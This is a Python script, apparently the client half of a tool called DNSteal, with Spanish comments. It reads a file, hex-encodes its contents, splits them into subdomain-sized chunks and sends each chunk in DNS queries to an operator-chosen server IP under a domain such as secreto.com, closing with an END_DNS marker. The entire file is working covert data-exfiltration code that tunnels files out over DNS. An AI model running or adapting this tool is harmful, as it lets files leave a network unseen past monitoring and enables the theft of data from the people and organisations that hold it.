#!/usr/bin/python

import dns.message
import dns.query
import socket
import argparse
import os
import binascii
import colorama
from colorama import Fore
from sys import exit



full_message = []


# Banner que queda bien
def banner():

	this_file = '''         -------  CLIENT  -------'''
	banner_tool='''    ____  _   _______ __             __
   / __ \/ | / / ___// /____  ____ _/ /
  / / / /  |/ /\__ \/ __/ _ \/ __ `/ / 
 / /_/ / /|  /___/ / /_/  __/ /_/ / /  
/_____/_/ |_//____/\__/\___/\__,_/_/   
	'''
	by = '''                            by Alex Mayo'''
	print("")
	print(Fore.GREEN + this_file)
	print(Fore.YELLOW + banner_tool)
	print(Fore.CYAN + by)
	print(Fore.RESET)


# Recolectamos el texto del archivo
def recolect_txt(document, ip, time, domain):

	with open(document, 'r') as f:
		start = "File: " + document
		print(Fore.MAGENTA + "\n" + start)
		text = f.read()
		f.close()
		dns_requests(text, ip, time, domain, document)


# Guardamos cadenas de 48 caracteres para poder enviarlas con el dominio
def reorganize_text(text, domain, document):

	# Esto lo hacemos para saber el tamaño del nombre del dominio y poder calcular el numero de caracteres que podemos enviar en una peticion
	x = len(domain) + 1

	start = "File: " + document + "\n"
	start = bytes(start, 'utf-8')
	start = binascii.hexlify(start)
	start = start.decode('UTF-8')

	z = 0
	max_caracters_start = 63 - x

	# El subdominio no puede superar los 53 caracteres
	if max_caracters_start > 53:
		max_caracters_start = 53

	# Agrupamos en grupos de x caracteres el nombre del archivo que nos llega o añadimos el nombre del archivo al principio del programa
	if len(start) > max_caracters_start:
		while z < len(start):
			init = z
			end = z + max_caracters_start
			full_message.append(start[init:end])
			z = end
	else:
		full_message.append(start)

	# [0:52]
	i = 0
	max_caracters = 63 - x

	# El subdominio no puede superar los 53 caracteres
	if max_caracters > 53:
		max_caracters = 53

	# Pasamos el texto a bytes para pasarlo después a hexadecimal y despues lo volvemos a pasar a string
	text = bytes(text, 'utf-8')
	text = binascii.hexlify(text)
	text = text.decode('UTF-8')

	# Agrupamos en grupos de x caracteres el texto que nos llega
	while i < len(text):
		init = i
		end = i + max_caracters
		full_message.append(text[init:end])
		i = end


def dns_requests(text ,ip, time, domain, document):

	i = 0

	end = "END_DNS"
	end = bytes(end, 'utf-8')
	end = binascii.hexlify(end)
	end = end.decode('UTF-8')

	print(Fore.GREEN + "\n\n  -|-  STARTING...  -|-  \n")
	print(Fore.RESET)

	print("Message to send:\n")
	print(text)
	print("\n\n|------------------------------------------------------------|\n")

	reorganize_text(text, domain, document)

	full_message.append(end)

	# Enviamos el mensaje peticion a peticion
	for split_text in full_message:

		i = i + 1
		print(Fore.MAGENTA + "Package Nº", i)
		print(Fore.RESET)

		# Juntamos el dominio con el mensaje
		URL_domain = str(split_text) + "." + domain

		request = dns.message.make_query(URL_domain, dns.rdatatype.A)

		response = dns.query.udp(request, ip, timeout = time)

		print(Fore.CYAN + "Message in Hexadecimal:" + Fore.RESET)
		print(str(split_text))

		print("\n|------------------------------------------------------------|\n")


def main():

	parser = argparse.ArgumentParser()

	# Se que podria poner required = True y no tendría que hacer el control de errores que hago con los else pero lo prefiero así porque queda mejor
	parser.add_argument('-s', '--server', type=str, nargs=1, help='[Required] IP you want to connect to')
	parser.add_argument('-f', '--file', type=str, nargs=1, help='[Required] File containing the message')
	parser.add_argument('-t', '--time', type=int, nargs=1, help='[Optional] Time that requests wait for a response from the server. Predet = 5')
	parser.add_argument('-d', '--domain', type=str, nargs=1, help='[Optional] Domain you want to use. Predet = secreto.com.')

	args = parser.parse_args()

	if args.time:
		time = args.time[0]
	else:
		time = 5

	if args.server:
		ip = str(args.server)
		# ['127.0.0.1'] -> 127.0.0.1
		ip = ip[2:-2]
	else:
		print(Fore.RED + "Error: Missing IP")
		exit(0)

	if args.file:
		document = str(args.file)
		# ['txt.txt'] -> txt.txt
		document = document[2:-2]
	else:
		print(Fore.RED + "Error: Missing file")
		exit(0)

	if args.domain:
		domain = str(args.domain)
		# ['secreto.com'] -> secreto.com
		domain = domain[2:-2]
	else:
		domain = "secreto.com."

	recolect_txt(document, ip, time, domain)


if __name__ == '__main__':

	banner()
	main()
